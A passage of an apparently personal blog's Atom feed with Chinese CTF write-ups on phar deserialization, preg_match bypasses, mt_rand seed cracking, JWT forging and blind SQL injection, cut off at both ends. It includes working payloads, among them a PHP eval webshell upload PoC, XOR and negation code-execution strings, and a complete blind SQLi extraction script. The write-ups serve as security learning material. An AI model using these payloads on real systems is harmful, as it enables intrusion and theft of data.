src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014454461.png" alt="image-20211028014454461"></p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014549020.png" alt="image-20211028014549020"></p><p>访问delete.php</p><p>注意为什么不访问download.php来实行攻击？</p><p>这里要注意一个细节：</p><p>download.php中存在</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014231785.png" alt="image-20211028014231785"></p><p>ini_set(“open_basedir”, getcwd() . “:/etc:/tmp”); 这个函数执行后，我们通过Web只能访问当前目录、/etc和/tmp三个目录，所以只能在delete.php中利用payload，而不是download.php，否则访问不到沙箱内的上传目录。</p><p>访问delete.php,使用phar进行反序列化，成功得到flag</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014632248.png" alt="image-20211028014632248"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目给出的是一个登录框，并且有注册操作&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-2021102</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="反序列化" scheme="https://sakurahack-y.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>phar反序列化漏洞</title>
    <link href="https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-10-27T12:41:33.000Z</published>
    <updated>2021-10-27T14:38:46.578Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。<br> 这个新的攻击方式被他公开在了美国的BlackHat会议演讲上，演讲主题为：”不为人所知的php反序列化漏洞”。它可以使攻击者将相关漏洞的严重程度升级为远程代码执行。我们在RIPS代码分析引擎中添加了对这种新型攻击的检测。</p><h1 id="关于流包装"><a href="#关于流包装" class="headerlink" title="关于流包装"></a>关于流包装</h1><p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<br> 例如常见的</p><pre><code class="php">include(&#39;php://filter/read=convert.base64-encode/resource=index.php&#39;);include(&#39;data://text/plain;base64,xxxxxxxxxxxx&#39;);</code></pre><p><code>phar://</code>也是流包装的一种</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>phar由四个部分组成，分别是stub、manifest describing the  contents、 the file contents、 [optional] a signature for verifying Phar  integrity (phar file format only)</p><p>stub:标识作用，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件；</p><p>manifest describing the contents:其实可以理解为phar文件本质上是一种压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面；</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/d8f9d72a6059252d260b20a9a98db93d5bb5b918.jpeg" alt="img"></p><p> the file contents:这里指的是被压缩文件的内容；</p><p>[optional] a signature for verifying Phar integrity (phar file format only):签名，放在结尾；</p><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p><p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p><pre><code class="php">&lt;?phpclass TestObject &#123;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new TestObject();$o -&gt; data=&#39;sakura&#39;;$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>访问一下，发现同目录下生成了一个.phar后缀的文件(如果这步无法创建，请修改php.ini的配置，设置phar.readonly = off 并去掉前面的分号)</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027213811961.png" alt="image-20211027213811961"></p><p>打开：</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027215216183.png" alt="image-20211027215216183"></p><p>发现写入的内容已经被序列化。</p><p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20180908164943-2151deae-b344-1.png" alt="img"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>phar_fan.php</p><pre><code class="php">&lt;?phpclass TestObject&#123;    function __destruct()    &#123;        echo $this -&gt; data;   // TODO: Implement __destruct() method.    &#125;&#125;include(&#39;phar://phar.phar&#39;);?&gt;</code></pre><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027215532641.png" alt="image-20211027215532641"></p><p>我们来简要说明下整个调用流程：</p><p>访问 phar_fun.php这个文件</p><p>执行incleude代码</p><p>解析phar文件</p><p>将里面的meta-data反序列化，在上述代码中也就是TestObject这个对象。</p><p>对象销毁，调用魔术方法__destruct()</p><p>执行echo语句完成攻击。</p><h1 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h1><p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><pre><code class="php">&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;sakura.phar&quot;);    $phar = new Phar(&quot;sakura.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头    $o = new TestObject();    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();?&gt;</code></pre><p>然后调用phar://sakura.php</p><p>是一样的效果。</p><h1 id="漏洞的利用条件"><a href="#漏洞的利用条件" class="headerlink" title="漏洞的利用条件"></a>漏洞的利用条件</h1><ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ol><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol><li>在文件系统函数的参数可控时，对参数进行严格的过滤。</li><li>严格检查上传文件的内容，而不是只检查文件头。</li><li>在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概要&quot;&gt;&lt;a href=&quot;#概要&quot; class=&quot;headerlink&quot; title=&quot;概要&quot;&gt;&lt;/a&gt;概要&lt;/h1&gt;&lt;p&gt;来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="反序列化" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="反序列化" scheme="https://sakurahack-y.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>preg_match正则绕过总结</title>
    <link href="https://sakurahack-y.github.io/2021/10/26/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2021/10/26/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</id>
    <published>2021-10-26T10:19:19.000Z</published>
    <updated>2021-10-26T14:43:25.075Z</updated>
    
    <content type="html"><![CDATA[<p>最近写题遇到了很多次pre_match函数，但并不是每次都可以绕过。于是想要把这个函数总结一下用法。我个人认为preg_match的绕过方法主要取决于其正则表达式的写法。</p><p>首先对正则表达式的常见符号解释一下。</p><p>/    /    是一种格式吧，正则表达式需要写在这个里面</p><p>^：匹配输入字符串的开始位置</p><p>$：匹配输入字符串的结束位置</p><h1 id="换行符绕过-0a"><a href="#换行符绕过-0a" class="headerlink" title="换行符绕过(%0a)"></a>换行符绕过(%0a)</h1><pre><code class="php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);$c = $_GET[&#39;c&#39;];if (preg_match(&#39;/^flag$/i&#39;, $c) &amp;&amp; $c !== &#39;flag&#39;) &#123;    echo $flag;&#125;else&#123;    echo &quot;nonono&quot;;&#125;</code></pre><p>由于pre_match这个函数是只能匹配一行的数据，所以我们可以用%0a(也就是换行符)来绕过。</p><p>这里是因为$会忽略换行符</p><p>因此本题我们传入?c=flag%0a  即可绕过</p><p>注意此时正则表达式的模式是: i</p><h1 id="利用数组绕过"><a href="#利用数组绕过" class="headerlink" title="利用数组绕过"></a>利用数组绕过</h1><p> preg_match只能处理字符串，当传入的subject是数组时会返回false</p><h1 id="5c绕过"><a href="#5c绕过" class="headerlink" title="%5c绕过"></a>%5c绕过</h1><pre><code class="php">&lt;?php show_source(__FILE__); $key = &quot;bad&quot;; extract($_POST);        // 使用POST接收参数 if($key === &#39;bad&#39;)&#123;        // $key 与 &#39;bad&#39; 进行比较，值不相同时才可以继续运行代码    die(&#39;badbad!!!&#39;); &#125; $act = @$_GET[&#39;act&#39;];    // 获得 act 参数 $arg = @$_GET[&#39;arg&#39;];    // 获得 arg 参数 if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;,$act)) &#123;    // 针对act参数进行过滤    echo &#39;check&#39;; &#125; else &#123;    $act($arg,&#39;&#39;);        // 动态调用 &#125; echo &#39;666&#39;;</code></pre><pre><code>/i不区分大小写/s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]/D如果使用$限制结尾字符,则不允许结尾有换行;</code></pre><p>这里存在/s和/D因此它会匹配到换行，%0a因此就无法绕过。这时候就可以使用%5c</p><h1 id="preg-match-“-e”-注：php版本需要小于5-5-0"><a href="#preg-match-“-e”-注：php版本需要小于5-5-0" class="headerlink" title="preg_match(“/^$/e”) (注：php版本需要小于5.5.0)"></a>preg_match(“/^$/e”) (注：php版本需要小于5.5.0)</h1><pre><code class="php">&lt;?highlight_file(__FILE__);echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);?&gt;</code></pre><p>payload=xx?h=phpinfo();</p><h1 id="PHP利用PCRE回溯次数限制绕过某些安全限制"><a href="#PHP利用PCRE回溯次数限制绕过某些安全限制" class="headerlink" title="PHP利用PCRE回溯次数限制绕过某些安全限制"></a>PHP利用PCRE回溯次数限制绕过某些安全限制</h1><p>poc</p><pre><code class="php">import requestsfrom io import BytesIOfiles = &#123;  &#39;file&#39;: BytesIO(b&#39;aaa&lt;?php eval($_POST[txt]);//&#39; + b&#39;a&#39; * 1000000)&#125;res = requests.post(&#39;http://51.158.75.42:8088/index.php&#39;, files=files, allow_redirects=False)print(res.headers)</code></pre><p>payload:?a=ssss………..省略n个字符，突破100万</p><h1 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h1><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;        $code=$_GET[&#39;code&#39;];            if(strlen($code)&gt;40)&#123;                    die(&quot;This is too Long.&quot;);                    &#125;            if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                    die(&quot;NO.&quot;);                    &#125;            @eval($code);&#125;else&#123;        highlight_file(__FILE__);&#125;highlight_file(__FILE);// ?&gt;</code></pre><p>可以使用各种特殊字符的异或构造出字母和数字</p><p>脚本：</p><pre><code class="php">str = r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]&#123;&#125;/&quot;for i in range(0, len(str)):    for j in range(0, len(str)):        a = ord(str[i])^ord(str[j])        print(str[i] + &#39; ^ &#39; + str[j] + &#39; is &#39; + chr(a))</code></pre><p>payload:</p><pre><code class="php">?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=phpinfo</code></pre><h1 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h1><p>把getFlag取反然后URL编码： </p><pre><code class="php"> &lt;?php echo urlencode(~&quot;getFlag&quot;); </code></pre><p>–&gt; %98%9A%8B%B9%93%9E%98</p><p>依据这个我们可以构造payload: </p><pre><code class="php"> ?code=$_=~%98%9A%8B%B9%93%9E%98;$_(); </code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近写题遇到了很多次pre_match函数，但并不是每次都可以绕过。于是想要把这个函数总结一下用法。我个人认为preg_match的绕过方法主要取决于其正则表达式的写法。&lt;/p&gt;
&lt;p&gt;首先对正则表达式的常见符号解释一下。&lt;/p&gt;
&lt;p&gt;/    /    是一种格式吧，正</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见函数" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/"/>
    
    
    <category term="preg_match" scheme="https://sakurahack-y.github.io/tags/preg-match/"/>
    
  </entry>
  
  <entry>
    <title>GWCTF 2019枯燥的抽奖_0x30-0x3f</title>
    <link href="https://sakurahack-y.github.io/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/"/>
    <id>https://sakurahack-y.github.io/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/</id>
    <published>2021-10-24T15:57:20.000Z</published>
    <updated>2021-10-25T05:44:21.834Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235829685.png" alt="image-20211024235829685"></p><p>查看源代码</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235901200.png" alt="image-20211024235901200"></p><p>看到一个关键点，check.php，访问一下</p><pre><code class="php"> &lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#39;seed&#39;]))&#123;$_SESSION[&#39;seed&#39;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#39;seed&#39;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#39;&#39;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123;    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#39;num&#39;]))&#123;    if($_POST[&#39;num&#39;]===$str)&#123;x        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;;    &#125;    else&#123;        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;    &#125;&#125;show_source(&quot;check.php&quot;); </code></pre><p>这里涉及到了伪随机数漏洞，即当确定了种子后，随机数每次生成数的所有数是重复得，并不是真正意义上的随机数。</p><pre><code class="php">&lt;?php  mt_srand(12345);    echo mt_rand().&quot;&lt;br/&gt;&quot;;?&gt;  </code></pre><p>当你每次运行这个函数得到的随机数都是相同的。</p><p>这个就像一个关系式：y=ax，如果我们能得到y和a就可以推出x。</p><p>当然，实际上这个函数的关系是十分复杂的，但我们仍然可以用工具去破解。</p><p>首先，我们要把题目给我们的线索转化为脚本可读的形式：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025011936452.png" alt="image-20211025011936452"></p><pre><code class="python">str1 = &#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;str2 = &#39;nngMHvCoQB&#39;res = &#39;&#39;for i in range(len(str2)):    for j in range(len(str1)):        if str2[i] == str1[j]:            res += str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;            breakprint(res)</code></pre><p>![image-20211025012020617](GWCTF-2019枯燥的抽奖-0x30-0x3f/image-20211025012020617.png</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/Kali-Linux-2021.3-vmware-amd64-2021-10-25-01-20-39.png" alt="Kali-Linux-2021.3-vmware-amd64-2021-10-25-01-20-39"></p><p>获得到了种子，我们来生成下后序的字符串：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025012917063.png" alt="image-20211025012917063"></p><p>我们看到前面十位完全吻合。</p><p>提交：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025013042600.png" alt="image-20211025013042600"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235829685.png&quot; alt=&quot;image-202110242</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="伪随机数" scheme="https://sakurahack-y.github.io/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>WUSTCTF2020 颜值成绩查询_0x21-0x2F</title>
    <link href="https://sakurahack-y.github.io/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/"/>
    <id>https://sakurahack-y.github.io/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/</id>
    <published>2021-10-22T06:50:41.000Z</published>
    <updated>2021-10-22T06:55:50.285Z</updated>
    
    <content type="html"><![CDATA[<p>进去只有一个简单得输入框，测试下是否存在sql注入</p><p><img src="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image-20211022145243657.png" alt="image-20211022145243657"></p><p>先输入1，2，3等</p><p>发现有数据显示</p><p>使用异或</p><p><a href="http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/?stunum=0%5E1">http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/?stunum=0^1</a></p><p>结果显示得是stunum=1的界面</p><p>说明存在sql盲注</p><p>写一个简单脚本：</p><pre><code>import requestsimport timeurl = &quot;http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/&quot;data= &quot;&quot;for i in range(10000):    min = 32    max = 128    while (min &lt; max) :        mid = (min + max) // 2    # 爆破数据库名        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破表名        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破字段        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破数据        payload = &quot;?stunum=0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)&quot;%(i,mid)        urls = url+payload        print(urls)        response = requests.get(url=urls)        time.sleep(0.2)        if &quot;Hi admin, your score is: 100&quot; in response.text:            min = mid+1        else:            max = mid        mid = (min + max) // 2    data += chr(mid)    print(data)</code></pre><p><img src="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image-20211022145433880.png" alt="image-20211022145433880"></p><p>写这个脚本花了挺长时间，原因是对sql注入语句还不熟练，容易被括号迷惑，看晕。</p><p>以后要注重写代码的能力。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;进去只有一个简单得输入框，测试下是否存在sql注入&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="SQL" scheme="https://sakurahack-y.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019 华北赛区 Day1 Web2 ikun_0x10-0x1F</title>
    <link href="https://sakurahack-y.github.io/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/"/>
    <id>https://sakurahack-y.github.io/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/</id>
    <published>2021-10-20T15:35:31.000Z</published>
    <updated>2021-10-20T15:57:31.863Z</updated>
    
    <content type="html"><![CDATA[<p>一打开页面，很魔性。。</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020233731895.png" alt="image-20211020233731895"></p><p>先注册个账号</p><p>下面提示一定要买到lv6</p><p>翻了好几面，没有找到，于是写了一个简单的爬虫脚本：S</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234222133.png" alt="image-20211020234222133"></p><p>注意爬虫要慢一点，buu很容易崩。</p><pre><code class="python">import urllib.requestimport timefor i in range(0,1000):    url = &#39;http://272059db-2e14-4adc-ae85-8f5a64a35acb.node4.buuoj.cn:81/shop?page=&#39;+str(i)    print(url)    time.sleep(1)    response = urllib.request.urlopen(url).read().decode(&#39;utf-8&#39;)    if &#39;lv6.png&#39; in response:        print(i)        break</code></pre><p>发现在181面</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234439410.png" alt="image-20211020234439410"></p><p>不过钱却不太够，用burp抓下包试一试</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234524015.png" alt="image-20211020234524015"></p><p>发现discount=0.8，将它改小</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234610565.png" alt="image-20211020234610565"></p><p>发现只允许admin登录</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234638452.png" alt="image-20211020234638452"></p><p>仔细分析下数据包，发现了jwt，解一下码：</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235006767.png" alt="image-20211020235006767"></p><p>爆破一下（感觉这个挺靠运气和字典吧）</p><p>发现密钥为 1Kun</p><p>重新生成admin的jwt</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235300543.png" alt="image-20211020235300543"></p><p>查看源代码:</p><p>在这里发现源码泄露：</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235354388.png" alt="image-20211020235354388"></p><p>下载下来，找到一个叫admin.py的文件，打开</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235429287.png" alt="image-20211020235429287"></p><p>看到了pickle，查阅资料可知：</p><p>假设你有一个字典，你想存储它，稍后再取出来。你可以把它的内容写入一个文件，小心翼翼地确保使用了正确地格式，要把它读取出来，你可以使用 exec() 或处理文件输入。但是这种方法并不可靠：如果你使用纯文本来存储重要数据，数据很容易以多种方式被破坏或者修改，导致你的程序崩溃，更糟糕的情况下，还可能在你的计算机上运行恶意代码。因此，我们要pickle它:</p><pre><code>import pickledata = &#123;&#39;foo&#39;: [1,2,3],                &#39;bar&#39;: (&#39;Hello&#39;, &#39;world!&#39;),                &#39;baz&#39;: True&#125;jar = open(&#39;data.pkl&#39;, &#39;wb&#39;)pickle.dump(data, jar) # 将pickle后的数据写入jar文件jar.close()</code></pre><p>过了几个小时，我们想把它取出来，我们只需要反pickle它:</p><pre><code>import picklepkl_file = open(&#39;data.pkl&#39;, &#39;rb&#39;) # 与pickle后的数据连接data = pickle.load(pkl_file) # 把它加载进一个变量print datapkl_file.close()</code></pre><p>将会发生什么？正如你期待的，它就是我们之前的 data 。</p><p>现在，还需要谨慎地说一句：  pickle并不完美。Pickle文件很容易因为事故或被故意的破坏掉。Pickling或许比纯文本文件安全一些，但是依然有可能被用来运行恶意代码。而且它还不支持跨Python版本，所以不要指望分发pickle对象之后所有人都能正确地读取。然而不管怎么样，它依然是一个强有力的工具，可以用于缓存和其他类型的持久化工作。</p><h3 id="11-13-2-Pickle你的对象"><a href="#11-13-2-Pickle你的对象" class="headerlink" title="11.13.2. Pickle你的对象"></a><a href="http://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id53">11.13.2. Pickle你的对象</a></h3><p>Pickle不仅仅可以用于内建类型，任何遵守pickle协议的类都可以被pickle。Pickle协议有四个可选方法，可以让类自定义它们的行为（这和C语言扩展略有不同，那不在我们的讨论范围之内）。</p><ul><li> <strong>getinitargs</strong>(self)</li></ul><p>  如果你想让你的类在反pickle时调用 <strong>init</strong> ，你可以定义__getinitargs__(self) ，它会返回一个参数元组，这个元组会传递给__init__ 。注意，这个方法只能用于旧式类。</p><ul><li> <strong>getnewargs</strong>(self)</li></ul><p>  对新式类来说，你可以通过这个方法改变类在反pickle时传递给 <strong>new</strong> 的参数。这个方法应该返回一个参数元组。</p><ul><li> <strong>getstate</strong>(self)</li></ul><p>  你可以自定义对象被pickle时被存储的状态，而不使用对象的 <strong>dict</strong> 属性。 这个状态在对象被反pickle时会被 <strong>setstate</strong> 使用。</p><ul><li> 